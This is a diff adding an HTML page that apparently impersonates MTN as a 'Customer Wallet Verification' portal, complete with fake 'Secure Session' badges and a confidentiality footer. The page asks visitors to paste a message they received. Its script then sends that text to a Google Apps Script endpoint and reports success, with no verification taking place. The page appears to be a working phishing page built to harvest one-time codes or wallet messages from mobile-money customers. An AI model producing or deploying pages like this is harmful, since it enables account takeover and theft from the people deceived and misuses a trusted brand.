@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Customer Wallet Verification</title>
+
+<style>
+
+:root{
+--mtn-yellow:#ffd400;
+--mtn-dark:#003b6f;
+--mtn-gold:#e6b800;
+}
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial, Helvetica, sans-serif;
+}
+
+body{
+background:linear-gradient(180deg,var(--mtn-yellow),#f0c400);
+min-height:100vh;
+display:flex;
+flex-direction:column;
+}
+
+.header{
+display:flex;
+align-items:center;
+gap:15px;
+padding:25px;
+background:var(--mtn-yellow);
+}
+
+.logo{
+width:60px;
+height:60px;
+background:white;
+border-radius:50%;
+display:flex;
+align-items:center;
+justify-content:center;
+font-weight:bold;
+font-size:22px;
+color:var(--mtn-yellow);
+}
+
+.header-text h2{
+color:var(--mtn-dark);
+}
+
+.header-text span{
+color:#555;
+display:block;
+margin-top:4px;
+}
+
+.secure-session{
+margin-top:10px;
+display:inline-flex;
+align-items:center;
+gap:8px;
+background:#ffe88a;
+padding:8px 18px;
+border-radius:25px;
+font-size:14px;
+}
+
+.green-dot{
+width:10px;
+height:10px;
+background:green;
+border-radius:50%;
+}
+
+.container{
+flex:1;
+display:flex;
+justify-content:center;
+align-items:center;
+padding:40px 20px;
+}
+
+.card{
+width:100%;
+max-width:600px;
+background:white;
+border-radius:25px;
+padding:40px;
+box-shadow:0px 18px 45px rgba(0,0,0,.18);
+}
+
+.card h1{
+font-size:36px;
+margin-bottom:10px;
+}
+
+.card p{
+color:#666;
+margin-bottom:30px;
+}
+
+textarea{
+width:100%;
+height:170px;
+padding:18px;
+border-radius:18px;
+border:2px solid var(--mtn-gold);
+font-size:16px;
+resize:none;
+outline:none;
+transition:.2s ease;
+}
+
+textarea:focus{
+border-color:#c49d00;
+}
+
+button{
+margin-top:25px;
+width:100%;
+padding:20px;
+border:none;
+border-radius:16px;
+background:var(--mtn-gold);
+color:white;
+font-size:20px;
+font-weight:bold;
+cursor:pointer;
+transition:.25s ease;
+}
+
+button:hover{
+background:#c49d00;
+}
+
+button:disabled{
+background:#999;
+cursor:not-allowed;
+}
+
+.status{
+margin-top:18px;
+font-weight:bold;
+display:none;
+}
+
+.status.success{
+color:green;
+}
+
+.status.error{
+color:red;
+}
+
+.footer{
+text-align:center;
+padding:25px;
+background:#eee;
+color:#666;
+font-size:14px;
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+
+<header class="header">
+
+<div class="logo">MTN</div>
+
+<div class="header-text">
+
+<h2>Customer Wallet Verification</h2>
+
+<span>Secure Review Portal</span>
+
+<div class="secure-session">
+
+<div class="green-dot"></div>
+
+Secure Session
+
+</div>
+
+</div>
+
+</header>
+
+
+
+<main class="container">
+
+<section class="card">
+
+<h1>Verify Received Message</h1>
+
+<p>Paste the message you received for review.</p>
+
+
+<form id="verificationForm">
+
+<textarea
+id="message"
+placeholder="Paste received message here..."
+required
+></textarea>
+
+
+<button id="submitBtn" type="submit">
+
+Submit for Verification
+
+</button>
+
+</form>
+
+
+<div id="successMsg" class="status success">
+
+Submission successful ✔️
+
+</div>
+
+<div id="errorMsg" class="status error">
+
+Submission failed ❗ Please try again.
+
+</div>
+
+</section>
+
+</main>
+
+
+
+<footer class="footer">
+
+© 2026 Customer Wallet Verification Portal.<br>
+All submissions are confidential and handled in accordance with our privacy policy.
+
+</footer>
+
+
+
+<script>
+
+const scriptURL =
+"https://script.google.com/macros/s/AKfycbwwvQ4emtMUjcTtAP84yozb8wy3waKmwZovL1P0xwlS_4KfN70Ltddk2wBRLfG0kZAd/exec";
+
+const form =
+document.getElementById("verificationForm");
+
+const submitBtn =
+document.getElementById("submitBtn");
+
+const successMsg =
+document.getElementById("successMsg");
+
+const errorMsg =
+document.getElementById("errorMsg");
+
+
+form.addEventListener("submit", function(e){
+
+e.preventDefault();
+
+successMsg.style.display="none";
+errorMsg.style.display="none";
+
+
+const message =
+document.getElementById("message").value.trim();
+
+
+if(message === ""){
+
+errorMsg.textContent =
+"Message cannot be empty";
+
+errorMsg.style.display="block";
+
+return;
+
+}
+
+
+submitBtn.disabled = true;
+
+submitBtn.textContent = "Submitting...";
+
+
+fetch(scriptURL,{
+
+method:"POST",
+
+headers:{
+"Content-Type":"text/plain;charset=utf-8"
+},
+
+body:JSON.stringify({
+message:message
+})
+
+})
+
+.then(()=>{
+
+successMsg.style.display="block";
+
+form.reset();
+
+})
+
+.catch(()=>{
+
+errorMsg.style.display="block";
+
+})
+
+.finally(()=>{
+
+submitBtn.disabled = false;
+
+submitBtn.textContent =
+"Submit for Verification";
+
+});
+
+});
+
+</script>
+
+
+</body>
+</html>
